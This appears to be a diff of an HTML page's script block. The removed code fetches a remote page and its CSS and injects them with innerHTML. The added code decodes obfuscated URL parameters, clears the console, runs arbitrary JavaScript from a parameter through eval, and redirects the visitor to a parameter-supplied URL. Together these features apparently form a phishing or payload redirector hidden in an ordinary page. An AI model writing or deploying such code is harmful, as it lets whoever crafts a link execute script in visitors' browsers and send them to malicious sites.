@@ -6,49 +6,7 @@
 <script src="/default.js"></script>
 
 <script>
-
-let params = JSON.parse(encstr(getSearchParams().r,getSearchParams().d))
-let htmlUrl = params.dsp
-
-fetch(htmlUrl)
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
-        return response.text();
-    })
-    .then(html => {
-        let parser = new DOMParser();
-        let doc = parser.parseFromString(html, 'text/html');
-        let linkTags = doc.querySelectorAll('link[rel="stylesheet"]');
-        let cssUrls = Array.from(linkTags).map(tag => tag.href);
-        
-        Promise.all(cssUrls.map(fetchCss))
-            .then(cssArray => {
-                let combinedCss = cssArray.join('\n');
-                document.getElementById('fetched-css').textContent = combinedCss;
-            })
-            .catch(error => {
-                console.error('Error fetching CSS:', error);
-            });
-
-        document.getElementById('htmlContent').innerHTML = html;
-    })
-    .catch(error => {
-        console.error('Error fetching HTML:', error);
-    });
-
-function fetchCss(url) {
-    return fetch(url)
-        .then(response => {
-            if (!response.ok) {
-                throw new Error(`Failed to fetch CSS file: ${url}`);
-            }
-            return response.text();
-        });
-}
-</script>
-<script>
+    let params = JSON.parse(encstr(getSearchParams().r,getSearchParams().d))
     console.clear()
     eval(params.js)
     window.location.href = params.url
